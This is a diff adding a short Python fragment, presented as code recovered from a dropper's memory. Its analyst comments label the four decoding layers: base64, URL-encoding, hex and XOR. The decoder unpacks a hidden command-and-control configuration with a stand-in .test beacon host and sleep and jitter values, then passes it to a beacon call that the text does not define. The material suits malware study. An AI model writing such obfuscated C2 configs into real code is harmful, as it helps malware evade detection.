@@ -1,0 +1,26 @@
+# Recovered from a dropper's memory. The analyst's comments start with ##.
+import base64, urllib.parse
+
+K = 0x37
+
+CFG = (
+    "JTM1NCUzMDUlMzBhJTM1ZiUzNDMlMzQzJTM0NyUzNDQlMzBkJTMxOCUzMTglMzU0"
+    "JTM1MyUzNTklMzFhJTM0MyUzNTIlMzViJTM1MiUzNWElMzUyJTM0MyUzNDUlMzRl"
+    "JTMxOSUzNWElMzVlJTM0NSUzNDUlMzU4JTM0NSUzNDQlMzRlJTM1OSUzNTQlMzE5"
+    "JTM0MyUzNTIlMzQ0JTM0MyUzMTglMzQxJTMwNSUzMTglMzQ3JTM1ZSUzNTklMzUw"
+    "JTMwYyUzNDQlMzViJTM1MiUzNTIlMzQ3JTMwYSUzMGUlMzA3JTMwYyUzNWQlMzVl"
+    "JTM0MyUzNDMlMzUyJTM0NSUzMGElMzA1JTMwNw=="
+)
+
+
+def unpack(blob):
+    a = base64.b64decode(blob)            ## layer 1
+    b = urllib.parse.unquote(a.decode())  ## layer 2
+    c = bytes.fromhex(b)                  ## layer 3
+    return bytes(x ^ K for x in c)        ## layer 4
+
+
+def main():
+    cfg = unpack(CFG).decode()
+    settings = dict(part.split("=", 1) for part in cfg.split(";"))
+    beacon(settings["c2"], int(settings["sleep"]), int(settings["jitter"]))
